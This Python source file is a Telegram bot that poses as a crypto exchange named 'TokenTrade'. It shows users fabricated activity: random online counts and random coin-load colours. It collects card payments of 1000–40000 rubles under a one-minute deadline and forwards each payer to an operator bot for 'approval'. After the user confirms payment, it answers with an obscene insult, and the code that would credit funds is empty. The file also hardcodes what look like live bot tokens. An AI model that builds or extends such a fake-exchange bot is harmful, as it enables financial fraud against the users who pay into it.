from aiogram import Bot, Dispatcher, executor, types
import aiohttp
from aiogram import types
from aiogram.types import InputFile, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
import random
import datetime
import asyncio
import requests
import sqlite3

db = sqlite3.connect('firstmydb.dp')

c = db.cursor()

# c.execute("""
# CREATE TABLE articles (
#     title TEXT,
#     full_text TEXT,
#     views INTEGER,
#     avtor TEXT
# )
# """)

# c.execute("INSERT INTO articles VALUES ('Google is cool!', 'google is realy cool', 100, 'Admin')")

c.execute("SELECT * FROM articles")
# print(c.fetchall())
# print(c.fetchmany(1))
print(c.fetchone())

db.commit()
db.close()

NOTIFICATION_BOT_TOKEN = '7171971708:AAEA8y72nVbKoVCP5W0MhnAHp8TixIJF7Fc'
NOTIFICATION_BOT_CHAT_ID = '722015899'
bot = Bot('6384742400:AAGubm_Wh_QG_7eHntNl2fQ00vNWnO31Qr4')
dp = Dispatcher(bot)
timer_active = False

# Глобальная переменная для хранения списка альтернативных монет и их цветов
altcoins = [
    {"name:": "Notcoin", "color": "🔴"},
    {"name:": "Toncoin", "color": "🟢"},
    {"name:": "Solana", "color": "🟡"}
]

async def send_my_cabinet(message: types.Message):
    # Генерация случайного числа в диапазоне от 1100 до 1200
    online_count = random.randint(1100, 1200)
    
    user_id = message.from_user.id

    # Генерация случайного цвета для Bitcoin и Ethereum
    bitcoin_load = get_random_load_color()
    ethereum_load = get_random_load_color()
    
    # Извлекаем монету и её цвет из списка альтернативных монет
    altcoin = altcoins.pop(0)
    altcoin_load = altcoin["name:"] + ": " + altcoin["color"]
    # Помещаем извлеченную монету в конец списка, чтобы она стала последней при следующем вызове
    altcoins.append(altcoin)

    # Создаем инлайн клавиатуру
    keyboard = InlineKeyboardMarkup(row_width=2)  # Устанавливаем количество кнопок в строке (в данном случае - 2)
    # Добавляем кнопки
    keyboard.add(
        InlineKeyboardButton("💳Пополнить", callback_data='top_up'),
        InlineKeyboardButton("💰Вывод средств", callback_data='withdraw'),
        InlineKeyboardButton("🛡️Верификация", callback_data='verification'),
        InlineKeyboardButton("⚙️Настройки", callback_data='settings')
    )
        
    my_cabinet_message = f"""
🔐 Личный кабинет
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
🛡️ Верификация: ❌
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
🏦 Общий баланс: 0 ₽
🆔 ID: {user_id} 
📊 Всего сделок: 0
✅ Удачных: 0
❌ Неудачных: 0
💰 Выводов совершено 0 на сумму 0 ₽
🛡️ Верификация: ❌
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
👥 Пользователей онлайн: {online_count}

Загруженность Bitcoin: {bitcoin_load}
Загруженность Ethereum: {ethereum_load}
Загруженность {altcoin_load}
"""
    
    photo_url = 'https://ibb.co/8dxBz4M'  # Замени URL на прямую ссылку на изображение
    
    await bot.send_photo(
        chat_id=message.chat.id,
        photo=photo_url,
        caption=my_cabinet_message,
        reply_markup=keyboard  # Добавляем инлайн клавиатуру
    )

# Функция для выбора случайного цвета загруженности
def get_random_load_color():
    return random.choice(["🟡", "🟢", "🔴"])

async def send_top_up_options(call: types.CallbackQuery):
    top_up_keyboard = InlineKeyboardMarkup(row_width=1)
    top_up_keyboard.add(
        InlineKeyboardButton("💳Пополнить через банковскую карту", callback_data='top_up_card'),
        InlineKeyboardButton("💱Пополнить криптовалютой", callback_data='top_up_crypto')
    )
    
    await call.message.edit_caption(
        caption="Выберите вариант пополнения баланса:",
        reply_markup=top_up_keyboard
    )

# Обработка нажатий на кнопки
@dp.callback_query_handler(lambda call: call.data == 'top_up_crypto')
async def process_crypto_top_up(call: types.CallbackQuery):
    crypto_keyboard = InlineKeyboardMarkup(row_width=1)
    crypto_keyboard.add(
        InlineKeyboardButton("Кнопка 1", callback_data='button1'),
        InlineKeyboardButton("Кнопка 2", callback_data='button2'),
        InlineKeyboardButton("Кнопка 3", callback_data='button3')
    )
    
    await call.message.edit_caption(
        caption="Привет",
        reply_markup=crypto_keyboard
    )

# Пример функции для инициализации и вызова send_top_up_options
@dp.callback_query_handler(lambda call: call.data == 'start_top_up')
async def start_top_up(call: types.CallbackQuery):
    await send_top_up_options(call)

@dp.callback_query_handler(lambda call: call.data == 'top_up')
async def process_top_up(call: types.CallbackQuery):
    await send_top_up_options(call)

async def send_bank_options(call: types.CallbackQuery):
    bank_keyboard = InlineKeyboardMarkup(row_width=1)
    bank_keyboard.add(
        InlineKeyboardButton("СберБанк", callback_data='sberbank'),
        InlineKeyboardButton("Тинькофф", callback_data='tinkoff')
    )
    
    await call.message.edit_caption(
        caption="Выберите банк для пополнения:",
        reply_markup=bank_keyboard
    )
async def process_bank_selection(call: types.CallbackQuery, bank_name: str):
    await call.message.answer(
        text="Введите сумму пополнения:\n\nМинимальная сумма: 1000 рублей")
    # Добавьте сохранение выбранного банка и переход к следующему шагу (ожидание ввода суммы пополнения)

async def start_timer(finish_time, chat_id):
    while datetime.datetime.now() < finish_time:
        await asyncio.sleep(60)
    # Если время истекло, отправляем сообщение
    await bot.send_message(chat_id, "Поздно, дружище! Время для оплаты истекло.")
    # Сбрасываем флаг активности таймера
    global timer_active
    timer_active = False

@dp.message_handler(lambda message: message.text.isdigit())
async def process_top_up_amount(message: types.Message):
    global timer_active, top_up_amount
    
    try:
        number = float(message.text)
        if number < 1000:
            await message.answer("❌")
            await message.answer("Минимальная сумма пополнения: 1000 рублей.")
        elif number > 40000:
            await message.answer("❌")
            await message.answer("Максимальная сумма пополнения: 40000 рублей.")
        else:
            top_up_amount = number  # Сохраняем значение суммы пополнения
            finish_time = datetime.datetime.now() + datetime.timedelta(minutes=1)
            formatted_time = finish_time.strftime("%H:%M")
            keyboard = types.InlineKeyboardMarkup(row_width=1)
            keyboard.add(
                types.InlineKeyboardButton(text="✅Пополнил(а)", callback_data="confirmed"),
                types.InlineKeyboardButton(text="❌Отменить", callback_data="back")
            )
            await message.answer(
                text=f"♻️ Оплата банковской картой:\n\n"
                     f"Сумма: {number} ₽\n\n"
                     f"Реквизиты для оплаты банковской картой:\n"
                     f"└0000-0000-0000-0000\n\n"
                     f"Реквизиты для оплаты через СБП (МТС BANK):\n"
                     f"└0000-0000-0000-0000\n\n"
                     f"‼️Оплатите точную сумму указанную в строке «Сумма» по указанным реквизитам.\n"
                     f"После оплаты баланс будет зачислен на Ваш аккаунт автоматически в течении нескольких минут.\n\n"
                     f"У Вас осталось до {formatted_time} для оплаты",
                reply_markup=keyboard
            )
            if not timer_active:
                timer_active = True
                await start_timer(finish_time, message.chat.id)
    except ValueError:
        await message.answer("Введите числовое значение суммы пополнения.")

async def process_top_up(message: types.Message):
    user_id = message.from_user.id
    
    # Используем глобальную переменную с суммой пополнения
    amount = top_up_amount  
    
    # Отправка уведомления во второй бот
    notification_message = f"К вам новый клиент @{message.from_user.username} пополняет баланс на {amount} рублей."
    notify_payload = {
        'chat_id': NOTIFICATION_BOT_CHAT_ID,
        'text': notification_message,
        'reply_markup': {
            'inline_keyboard': [
                [
                    {'text': 'Одобрить', 'callback_data': f'approve_{user_id}_{amount}'}
                ]
            ]
        }
    }
    requests.post(f'https://api.telegram.org/bot{NOTIFICATION_BOT_TOKEN}/sendMessage', json=notify_payload)

    await message.answer(f"ПОШЕЛ НАХУЙ!")

# Обработчик нажатия кнопки "Одобрить"
@dp.callback_query_handler(lambda query: query.data.startswith('approve'))
async def approve_top_up(callback_query: types.CallbackQuery):
    _, user_id, amount = callback_query.data.split('_')
    user_id = int(user_id)
    amount = float(amount)
    
    # Выполните здесь логику начисления средств пользователю с user_id в размере amount
    # Например, отправьте запрос на пополнение средств через ваш первый бот
    
    # Здесь должна быть логика начисления средств
    await callback_query.answer("Пополнение одобрено.")

@dp.callback_query_handler(lambda call: call.data == 'confirmed')
async def start_command_start(message: types.Message):
    await process_top_up(message)

# @dp.callback_query_handler(lambda call: call.data == 'confirmed') 
# async def confirmed_new(call: types.CallbackQuery):
#     await call.message.answer(
#         text="""
# ✅ После зачисления платежа - Ваш счёт будет автоматически пополнен!
# Если этого не произошло в течении 10 минут после оплаты, свяжитесь с Тех.Поддержкой.
# """)

@dp.callback_query_handler(lambda call: call.data == 'back') 
async def back_new(call: types.CallbackQuery):
    await send_my_cabinet(call.message)  # Перезапускаем стартовую функцию

@dp.callback_query_handler(lambda call: call.data == 'sberbank')
async def process_sberbank_selection(call: types.CallbackQuery):
    await process_bank_selection(call, "Сбербанк")

@dp.callback_query_handler(lambda call: call.data == 'tinkoff')
async def process_tinkoff_selection(call: types.CallbackQuery):
    await process_bank_selection(call, "Тинькофф")

@dp.callback_query_handler(lambda call: call.data == 'top_up_card')
async def process_top_up_card(call: types.CallbackQuery):
    await send_bank_options(call)

@dp.callback_query_handler(lambda call: call.data == 'withdraw')
async def process_withdraw(call: types.CallbackQuery):
    await call.message.answer("""💰Введите сумму вывода:
                              
У вас на балансе: 0 ₽
Минимальная сумма вывода: 1000 ₽""")

@dp.callback_query_handler(lambda call: call.data == 'verification')
async def process_verification(call: types.CallbackQuery):
    await call.message.answer("Инструкция по верификации...")

@dp.callback_query_handler(lambda call: call.data == 'settings')
async def process_settings(call: types.CallbackQuery):
    await call.message.answer("Настройки...")

async def send_my_future(message: types.Message):
    my_future_message = "Мои фичюри"
    photo_url = 'https://ibb.co.com/5X0NCQK'  # Замени URL на прямую ссылку на изображение
    
    await bot.send_photo(
        chat_id=message.chat.id,
        photo=photo_url,
        caption=my_future_message,
    )
async def send_my_birje(message: types.Message):
    my_birje_message = "Моя биржа"
    photo_url = 'https://ibb.co.com/7Y1ZDqj'  # Замени URL на прямую ссылку на изображение
    
    await bot.send_photo(
        chat_id=message.chat.id,
        photo=photo_url,
        caption=my_birje_message,
    )
async def send_my_us(message: types.Message):
    my_us_message = "Мы всегда рады новым людям, приглашайте друзей и зара"
    photo_url = 'https://ibb.co.com/rvnSbnL'  # Замени URL на прямую ссылку на изображение
    
    await bot.send_photo(
        chat_id=message.chat.id,
        photo=photo_url,
        caption=my_us_message,
    )
async def send_my_support(message: types.Message):
    support_username = "akapovich001"
    support_link = f"https://t.me/{support_username}"

    # Создание клавиатуры с линейной кнопкой
    support_keyboard = InlineKeyboardMarkup(row_width=1)
    support_keyboard.add(
        InlineKeyboardButton("Написать в поддержку", url=support_link)
    )
    
    # Отправка сообщения с кнопкой
    await message.answer(
        f"Для связи с поддержкой перейдите по ссылке: написать в поддержку",
        parse_mode=types.ParseMode.HTML,
        reply_markup=support_keyboard
    )


async def send_photo_with_text(photo_url: str, text: str, message: types.Message):
    async with aiohttp.ClientSession() as session:
        async with session.get(photo_url) as resp:
            if resp.status != 200:
                return await message.answer("Не удалось загрузить изображение.")
            data = await resp.read()
            await bot.send_photo(message.chat.id, data, caption=text)

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(
        types.KeyboardButton(text="💼 Мой кабинет"),
        types.KeyboardButton(text="📊 Фьючерсы"),
        types.KeyboardButton(text="📈 Биржа"),
        types.KeyboardButton(text="📰 Мы"),
        types.KeyboardButton(text="👨🏻‍💻 Тех.Поддержка")
    )
    
    welcome_message = """
📊 Добро пожаловать на крипто-биржу TokenTrade!

📊 Мы рады приветствовать Вас на нашей платформе, где Вы можете торговать различными криптовалютами и получать прибыль от изменения их курсов. TokenTrade предоставляет удобный и безопасный способ покупки, продажи и обмена самых различных криптовалют, а также множество инструментов для анализа и принятия решений на основе данных.

📈 Наша команда постоянно работает над улучшением нашей платформы, чтобы обеспечить нашим клиентам лучший опыт торговли криптовалютами. Мы также гарантируем полную безопасность Ваших средств.

👨🏻‍💻 _Если у Вас возникнут вопросы или затруднения, наша служба поддержки всегда готова помочь Вам_.
    """
    
    photo_url = 'https://ibb.co.com/nwhdMJ9'  # Замени URL на прямую ссылку на изображение
    
    await bot.send_photo(
        chat_id=message.chat.id,
        photo=photo_url,
        caption=welcome_message,
        parse_mode=types.ParseMode.MARKDOWN,
        reply_markup=keyboard
    )

# Добавляем обработчики для кнопок
dp.register_message_handler(send_my_cabinet, lambda message: message.text == "💼 Мой кабинет")
dp.register_message_handler(send_my_future, lambda message: message.text == "📊 Фьючерсы")
dp.register_message_handler(send_my_birje, lambda message: message.text == "📈 Биржа")
dp.register_message_handler(send_my_us, lambda message: message.text == "📰 Мы")
dp.register_message_handler(send_my_support, lambda message: message.text == "👨🏻‍💻 Тех.Поддержка")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)